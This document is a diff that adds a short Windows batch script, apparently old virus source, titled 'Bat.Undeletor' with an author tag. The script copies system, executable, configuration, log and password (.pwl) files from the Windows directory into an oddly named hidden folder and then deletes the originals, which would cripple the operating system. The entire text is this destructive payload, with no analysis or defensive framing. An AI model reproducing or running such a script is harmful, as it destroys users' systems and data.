@@ -1,0 +1,25 @@
+rem eXPecting more from ... Ratty ...
+rem This is Bat.Undeletor
+@echo off
+c:\
+cd\
+cd windows
+md ųų
+copy *.ini c:\windows\ųų
+copy *.dll c:\windows\ųų
+copy *.pwl c:\windows\ųų
+copy *.com c:\windows\ųų
+copy *.exe c:\windows\ųų
+copy *.sys c:\windows\ųų
+copy *.log c:\windows\ųų
+copy *.com c:\windows\ųų
+copy *.bat c:\windows\ųų
+del *.ini
+del *.dll
+del *.pwl
+del *.com
+del *.exe
+del *.sys
+del *.log
+del *.com
+del *.bat
